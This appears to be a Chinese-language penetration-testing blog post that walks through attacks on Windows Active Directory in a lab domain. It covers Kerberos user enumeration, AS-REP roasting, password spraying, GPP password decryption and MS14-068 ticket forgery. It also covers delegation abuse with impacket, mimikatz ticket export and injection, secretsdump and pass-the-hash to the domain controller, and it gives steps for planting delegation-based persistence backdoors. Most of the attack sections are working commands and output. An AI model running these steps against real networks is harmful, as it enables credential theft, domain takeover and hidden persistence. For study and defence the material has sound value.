<h3 id="常见信息搜集命令"><a href="#常见信息搜集命令" class="headerlink" title="常见信息搜集命令"></a>常见信息搜集命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span><br><span class="line"></span><br><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机</span><br><span class="line">net group <span class="string">&quot;Domain controllers&quot;</span> -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表</span><br><span class="line">net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname</span><br><span class="line"></span><br><span class="line">dsquery computer domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net group <span class="string">&quot;domain</span></span><br><span class="line"><span class="string">computers&quot;</span> /domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </span><br><span class="line"></span><br><span class="line">NETBIOS 信息收集</span><br><span class="line">SMB 信息收集</span><br><span class="line">空会话信息收集</span><br><span class="line">漏洞信息收集等</span><br></pre></td></tr></table></figure>



<h3 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h3><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>，所以当我们没有域凭证时，可以通过<code>Kerberos pre-auth</code>从域外对域用户进行用户枚举。</p>
<p>使用工具<a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
<img src="/image/image-20230927114433410.png" alt="image-20230927114433410" style="zoom:80%;" />

<h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>对于域用户，如果设置了选项<code>Do not require Kerberos preauthentication</code>(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用<code>hashcat</code>或是<code>john</code>对其破解，最终获得该用户的明文口令。<strong>默认情况下该配置不会设置</strong>。</p>
<p>使用impacket工具包<code>GetNPUsers.py</code>发现不做Kerberos预认证用户：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GetNPUsers.py -dc-ip 192.168.17.134 0ne.<span class="built_in">test</span>/zhangsan:zs@123456</span><br><span class="line">GetNPUsers.py -dc-ip 192.168.17.134 0ne.<span class="built_in">test</span>/zhangsan:zs@123456 -format john -outputfile NPhashes</span><br><span class="line">john --wordlist=/usr/share/wordlists/FastPwds.txt NPhashes</span><br><span class="line"></span><br><span class="line"><span class="comment">#没有域凭证时,可以用户名枚举来查找未设置预认证的账号</span></span><br><span class="line">GetNPUsers.py -dc-ip 192.168.1.250 y5neko.com/ -usersfile users.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/image/image-20230927180448477.png" alt="image-20230927180448477" style="zoom: 67%;" />

<img src="/image/image-20230927180823906.png" alt="image-20230927180823906" style="zoom:80%;" />

<p>可以看到，通过user2普通账户扫描到了域管理员user1</p>
<img src="/image/image-20230927181320269.png" alt="image-20230927181320269" style="zoom:80%;" />

<p>无域凭证</p>
<img src="/image/image-20230927181836802.png" alt="image-20230927181836802" style="zoom:80%;" />

<p>该配置<code>不要求Kerberos预身份认证</code>默认不启用，可以给域内高权限用户配置该选项作为后门。</p>
<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p>在kerberos的AS-REQ认证中当用户名存在时，密码正确或者错误返回包结果不一样，所以可以尝试爆破密码。</p>
<p>通常爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./kerbrute_linux_amd64 passwordspray --dc 192.168.1.250 -d y5neko.com user.txt win71@123</span><br></pre></td></tr></table></figure>

<p>单用户爆破密码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./kerbrute_linux_amd64 bruteuser --dc 192.168.1.250 -d y5neko.com passwords.txt user1</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230927183050584.png" alt="image-20230927183050584" style="zoom:80%;" />



<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>使用<code>PsLoggendon.exe</code>定位域管理员：<br>可以查看指定用户域内登录过的主机或是某主机登录过的用户</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PsLoggendon.exe -accepteula administrator</span><br><span class="line">PsLoggendon.exe -accepteula \\DC2012</span><br></pre></td></tr></table></figure>



<h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>列出域控制器名称：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928165506180.png" alt="image-20230928165506180" style="zoom:80%;" />

<p>查看域控版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -schema -s base objectversion</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928165546832.png" alt="image-20230928165546832" style="zoom:80%;" />

<p>查询当前域中在线的计算机(只显示名称和操作系统)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928165623233.png" alt="image-20230928165623233" style="zoom:67%;" />

<p>查询当前域中所有计算机（只显示名称和操作系统）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -f <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928165824589.png" alt="image-20230928165824589" style="zoom:80%;" />

<p>查询当前域内所有用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -<span class="built_in">users</span> name</span><br></pre></td></tr></table></figure>

<p>查询域内所有GPO信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928170018338.png" alt="image-20230928170018338" style="zoom: 67%;" />

<p>查看指定域（y5neko.com）内非约束委派主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span>  cn</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928170251701.png" alt="image-20230928170251701" style="zoom:67%;" />













<h2 id="打域控的方法"><a href="#打域控的方法" class="headerlink" title="打域控的方法"></a>打域控的方法</h2><h3 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h3><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。</p>
<p><strong>组策略</strong></p>
<p>组策略全称Group Policy Preferences，也就是GPP，常说的GPP漏洞就是这里的MS14-025漏洞。什么情况下会使用到组策略，系统中我们可以新建用户，默认最高权限账号为administrator，一般在域环境中管理员为了限制大家的权限不会给与administrator权限，这个时候就需要使用GPP来更改所有主机的内置管理员账号密码（user@123）</p>
<img src="/image/image-20230926151408415.png" alt="image-20230926151408415" style="zoom: 50%;" />

<p><strong>原理</strong></p>
<p>我们提到过组策略可以批量更改所有主机的内置管理员账号密码，在新建完组策略，策略对象并添加本地账号密码后，会再域服务下面目录会生成这几个文件</p>
<img src="/image/image-20230926152037957.png" alt="image-20230926152037957" style="zoom:80%;" />

<p>id正好对应每个组策略的id</p>
<img src="/image/image-20230926152155772.png" alt="image-20230926152155772" style="zoom:50%;" />

<p>进入目录<code>C:\Windows\SYSVOL\domain\Policies\&#123;0AEAF235-B686-426D-B72C-34C64A71DF70&#125;\Machine\Preferences\Groups</code>下</p>
<img src="/image/image-20230926152312453.png" alt="image-20230926152312453" style="zoom: 67%;" />

<p>其中cpassword的值就是AES加密后的密码密文，正好微软公布了加密密钥</p>
<img src="/image/a25b8816507046fb93c8ce1ec0fca13d.png" alt="img" style="zoom:50%;" />

<p>使用kali自带工具直接解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpp-decrypt UVDbExfBIja6+i3M8Rwmwp7om2zdGbS12p4N/pl/AX8</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230926153336209.png" alt="image-20230926153336209" style="zoom:80%;" />

<p><strong>结论</strong></p>
<p>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p>
<p>能打域控是因为某些情况下管理员可能会用相同的密码，才有几率可以通过单一密码打下域控，就算不能打下域控也可以通过命令行切换本地管理员账户，达成脱域的攻击</p>
<p><strong>防御</strong></p>
<p>补丁KB2962486</p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14_068"></a>MS14_068</h3><p>1、获取域普通用户的账号密码<br>2、获取域普通用户的sid<br>3、服务器未打KB3011780补丁<br>4、域控服务器的IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user1:win71@123</span><br><span class="line">S-1-5-21-1493762544-529832293-733686757-1112</span><br><span class="line">192.168.1.250</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230926170929931.png" alt="image-20230926170929931" style="zoom:80%;" />

<img src="/image/image-20230926171005563.png" alt="image-20230926171005563" style="zoom:80%;" />

<p><strong>利用思路</strong></p>
<p>1、首先利用ms14-068提权工具生成伪造的kerberos协议认证证书（黄金票据）<br>2、利用mimikatz.exe将证书写入，从而提升为域管理员<br>3、测试是否能访问域控C盘目录，能访问则说明提升为域管理员<br>4、利用PsExec.exe获取域控shell，添加用户并将其加入域管理员组</p>
<p>得到黄金票据之后，通过mimikatz写入内存</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提取kirbi格式的文件</span></span><br><span class="line">kerberos::clist <span class="string">&quot;20221114105328_default_192.168.254.133_windows.kerberos_896806.bin&quot;</span> /export</span><br><span class="line"></span><br><span class="line">kerberos::purge         //清空当前所有凭证</span><br><span class="line">kerberos::list          //查看当前凭证</span><br><span class="line">kerberos::ptc TGT_tidetest@tide.org.ccache   //将票据注入到内存中</span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptc c:TGT_user1@Y5NEKO.COM.ccache&quot;</span> <span class="built_in">exit</span></span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230926203532609.png" alt="image-20230926203532609" style="zoom:80%;" />

<img src="/image/image-20230926203548981.png" alt="image-20230926203548981" style="zoom:80%;" />



<h2 id="域委派攻击"><a href="#域委派攻击" class="headerlink" title="域委派攻击"></a>域委派攻击</h2><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是<strong>主机账户</strong>，另一种是<strong>服务账户</strong>(域用户通过注册SPN也可以成为服务账号)。<br>Kerberos委派主要分为三种：</p>
<p><strong>非约束委派攻击</strong>：拿到非约束委派的主机权限，如能配合打印机BUG。则可以直接拿到域控权限。<br><strong>约束委派攻击</strong>：拿到配置了约束委派的域账户或主机服务账户，就能拿到它委派服务的administrator权限。<br><strong>基于资源的约束委派攻击</strong>：1.如果拿到将主机加入域内的域账号，即使是普通账号也可以拿到那些机器的system权限。 2.“烂番茄”本地提权</p>
<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。</p>
<p><strong>配置非约束委派</strong></p>
<img src="/image/image-20230928164205514.png" alt="image-20230928164205514" style="zoom:67%;" />

<p><strong>查找非约束委派主机</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span>  cn</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230928170523309.png" alt="image-20230928170523309" style="zoom:80%;" />

<p><strong>利用</strong></p>
<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br><span class="line"><span class="comment">#之后就可以带着票据任意使用了</span></span><br><span class="line">kerberos::ptt [0;77987]-2-0-40e10000-Administrator@krbtgt-Y5NEKO.COM.kirbi</span><br><span class="line">psexec64.exe \\DC.y5neko.com -accepteula -s cmd</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231006172913475.png" alt="image-20231006172913475" style="zoom: 67%;" />

<img src="/image/image-20231006173805088.png" alt="image-20231006173805088" style="zoom:67%;" />

<img src="/image/image-20231006175725584.png" alt="image-20231006175725584" style="zoom:67%;" />

<img src="/image/image-20231006180441869.png" alt="image-20231006180441869" style="zoom:80%;" />

<h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>普通的非约束委派攻击方式在实战情况下，除非域管理员连接过该服务，否则十分鸡肋，而在特定情况下，可以利用splooer服务让域控主动连接。</p>
<p>利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
<p>也就是说攻击者控制一个开启了非约束委派的主机账户，当域控开启Print Spooler服务时，攻击者可以主动要求域控访问该主机服务器，进而获取DC的TGT</p>
<img src="/image/image-20231007204829084.png" alt="image-20231007204829084" style="zoom:80%;" />

<p>Poc：<a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
<p>接着按照非约束委派的攻击方式即可</p>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：</p>
<ul>
<li>Service for User to Self(<strong>S4U2self</strong>)</li>
<li>Service for User to Proxy(<strong>S4U2proxy</strong>)</li>
</ul>
<p>这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。</p>
<p>不同于允许委派所有服务的⾮约束委派，约束委派的⽬的是在模拟⽤户的同时，限制委派机器&#x2F;帐户对特定服务的访问。</p>
<h4 id="委派流程"><a href="#委派流程" class="headerlink" title="委派流程"></a>委派流程</h4><blockquote>
<p>user访问service1，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对service1进行访问；如果配置了service1到service2的约束委派，则service1能使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC；DC返回service1一个用来访问service2的ST2票据,这样service1就能以用户的身份对service2发起访问。</p>
</blockquote>
<p>S4U2Self和S4U2proxy的请求过程：</p>
<img src="/image/image-20231007211239284.png" alt="image-20231007211239284" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#S4U2self</span></span><br><span class="line">1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。</span><br><span class="line">2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。</span><br><span class="line">3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据</span><br><span class="line">4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户</span><br><span class="line"><span class="comment">#尽管S4U2self service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#S4U2proxy</span></span><br><span class="line">5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。</span><br><span class="line">6. service1以用户的名义向KDC请求用户访问service2的ST2</span><br><span class="line">7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。</span><br><span class="line">8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证</span><br><span class="line">9. service2响应步骤8的请求。</span><br><span class="line">10. service1响应用户对步骤5中的请求。</span><br></pre></td></tr></table></figure>

<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>由于服务用户只能获取某个用户（或主机）的服务的ST1而非TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或hash，那么就可以伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</p>
<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，还可以访问使用与模拟帐户权限允许的任何服务。 (因为未检查SPN，只检查权限)。 比如，如果我们能够访问CIFS服务，那么同样有权限访问HOST服务。注意如果我们有权限访问到DC的LDAP服务，则有足够的权限去执行DCSync.</p>
<p><strong>配置约束委派</strong></p>
<p>首先新建一个专门用于约束委派的账号，然后使用setspn命令注册服务账号</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">setspn -U -A 服务名称/主机名.域名 域账号</span><br><span class="line">setspn -U -A yueshu_test/y5neko.com yueshu</span><br></pre></td></tr></table></figure>

<p>接着设置委派即可</p>
<img src="/image/image-20231007215744129.png" alt="image-20231007215744129" style="zoom:67%;" />

<p><strong>查找约束委派账户</strong></p>
<p>可以使用AdFind工具</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询约束委派用户</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"><span class="comment">#查询约束委派主机</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231007220143871.png" alt="image-20231007220143871" style="zoom:80%;" />

<p>也可以使用impacket工具包<code>findDelegation.py</code>找出所有的委派配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">findDelegation.py -dc-ip 192.168.1.250 -target-domain y5neko.com y5neko.com/user1:win71@123</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231007220756334.png" alt="image-20231007220756334" style="zoom:80%;" />

<h4 id="利用（后门）"><a href="#利用（后门）" class="headerlink" title="利用（后门）"></a>利用（后门）</h4><p>约束委派可以作为变种黄金票据，用作后门权限维持。<br>给后门账户[知道密码或是hash就成]注册SPN:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">setspn -U -A yueshu1_test/win71 yueshu1</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010110856007.png" alt="image-20231010110856007" style="zoom:67%;" />

<p>配置后门账户到域控的约束委派：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查找所有委派设置</span></span><br><span class="line">findDelegation.py -dc-ip 192.168.1.250 -target-domain y5neko.com y5neko.com/user1:win71@123</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010111137466.png" alt="image-20231010111137466" style="zoom:67%;" />

<img src="/image/image-20231010112212296.png" alt="image-20231010112212296" style="zoom:80%;" />

<p>使用impactet工具包中的getST.py模拟域管理员administrator账号申请访问域控的ldap服务的ST。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getST.py -dc-ip 192.168.1.250 -spn ldap/DC.y5neko.com -impersonate administrator y5neko.com/yueshu1 -hashes 00000000000000000000000000000000:1851fad1b3b4fb0dbad79a832a42d7d3 		<span class="comment">#LMhash可以用32位0填充</span></span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010165954840.png" alt="image-20231010165954840" style="zoom: 67%;" />

<p><img src="/image/image-20231010165913130.png" alt="image-20231010165913130"></p>
<img src="/image/image-20231010170018341.png" alt="image-20231010170018341" style="zoom: 80%;" />

<p>ptt横向，然后wmiexec到域控获取权限，或是secretsdump后随时随地pth域控</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">klist</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@dc.y5neko.com</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010170230704.png" alt="image-20231010170230704" style="zoom:80%;" />

<img src="/image/image-20231010170423240.png" alt="image-20231010170423240" style="zoom:80%;" />

<p>secretdump哈希值</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">secretsdump.py -k -no-pass dc.y5neko.com -just-dc-user administrator</span><br><span class="line">wmiexec.py y5neko/administrator@192.168.1.250  -hashes aad3b435b51404eeaad3b435b51404ee:7667ec0e5d9f6ed3802e427cf4aa1048</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010170822805.png" alt="image-20231010170822805" style="zoom:80%;" />

<h4 id="利用（横向）"><a href="#利用（横向）" class="headerlink" title="利用（横向）"></a>利用（横向）</h4><p>打下配置了约束委派的服务账号，我们就可以拿下被配置的约束委派的服务(A-&gt;B)。<br>和上述利用方式一致：用A账号getST模拟administrator获取访问B的ST，ptt，wmiexec。</p>
<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>基于资源的约束性委派 (<strong>RBCD</strong>：Resource Based Constrained Delegation)：为了使⽤户&#x2F;资源更加独⽴，微软在Windows Server 2012中引⼊了基于资源的约束性委派。基于资源的约束委派<strong>不需要域管理员权限</strong>去设置，⽽把设置属性的权限赋予给了机器⾃身。</p>
<p>配置了基于资源约束委派的账户，其中有一个属性 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> ，它的值为被允许基于资源约束性委派的账号的SID。</p>
<p>只有 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器才有 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 这个属性</p>
<p>在大型域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如下边实验中的test的用户）。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>配置约束委派，必须拥有<code>SeEnableDelegation</code>特权，该特权很敏感，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。<br>传统的约束委派是”正向的”，通过将service2的SPN添加到service1的<code>msDS-AllowedToDelegateTo</code>属性中，并且配置service1的<code>TrustedToAuthenticationForDelegation</code>属性为true。传统的约束委派S4U2self返回的票据一定是可转发的，如果不可转发那么S4U2proxy将失败；但是基于资源的约束委派不同，就算S4U2self返回的票据不可转发，S4U2proxy也是可以成功，并且S4U2proxy返回的票据总是可转发。<br>同时基于资源的约束委派(RBCD)配置则是相反的，通过将service1的SID添加到service2的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性中，就可以达到相同目的。<br>基于资源的约束委派具有传统的约束委派的所有安全问题，因为我们只需要拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，所以RBCD的利用比较于传统的约束委派场景多也简单。<br>默认情况下以下账户拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限：</p>
<ul>
<li><strong>Domain Admins</strong>(域管理员)</li>
<li><strong>mS-DS-CreatorSID</strong>(将该机器加入域的账户)</li>
<li><strong>NT AUTHORITY\SELF</strong>(机器账户本身)</li>
</ul>
<p>RBCD的利用条件：</p>
<ul>
<li>能修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</li>
<li>一个具有SPN的账户的TGT</li>
</ul>
<h4 id="利用（后门）-1"><a href="#利用（后门）-1" class="headerlink" title="利用（后门）"></a>利用（后门）</h4><p>首先注册资源约束服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">setspn -U -A ziyuanyueshu_test/win71 ziyuanyueshu</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20231011154951891.png" alt="image-20231011154951891"></p>
<p>需要域管理员权限，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。**<code>Domain Admins</code>**<br>使用ActiveDirectory模块，域控2012及以上默认安装。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount ziyuanyueshu</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231010175029335.png" alt="image-20231010175029335" style="zoom:67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getST.py -dc-ip 192.168.1.250 -spn krbtgt -impersonate administrator y5neko.com/ziyuanyueshu:ziyuanyueshu@123</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@dc.y5neko.com</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231011160140642.png" alt="image-20231011160140642" style="zoom: 80%;" />

<img src="/image/image-20231011160443492.png" alt="image-20231011160443492" style="zoom:80%;" />

<img src="/image/image-20231011160512927.png" alt="image-20231011160512927" style="zoom:80%;" />

<h4 id="利用（横向）-1"><a href="#利用（横向）-1" class="headerlink" title="利用（横向）"></a>利用（横向）</h4><p>A配置了到B的RBCD，打下A就可以打下B。**<code>和约束委派横向利用场景一致</code>**<br>某公司有专门加域的域用户A或是其有添加过多台机器入域，获取该账户的权限后，可利用基于资源的约束委派修改机器属性，批量获取机器权限。**<code>mS-DS-CreatorSID</code>**<br>如果我们想拿域内机器A的权限，如果我们又没有机器A的administrators组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户A依然可以获取权限。**<code>mS-DS-CreatorSID</code>**<br>如何查找类似的用户，非域管加域机器才会有<code>mS-DS-CreatorSID</code>属性：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369))&quot;</span> cn mS-DS-CreatorSID</span><br><span class="line"><span class="comment">#因为只有一台机器，我这里其实就是user1用户</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(objectsid=S-1-5-21-1493762544-529832293-733686757-1112))&quot;</span> objectclass cn dn</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231011161516529.png" alt="image-20231011161516529" style="zoom:80%;" />

<img src="/image/image-20231011161701438.png" alt="image-20231011161701438" style="zoom:80%;" />

<img src="/image/image-20231011165957286.png" alt="image-20231011165957286" style="zoom:80%;" />

<p>假设这个user1是专门加域用的账户，我们通过一定手段拿到了密码，然后添加机器账号，设置ziyuanyueshu1到WIN71的RBCD</p>
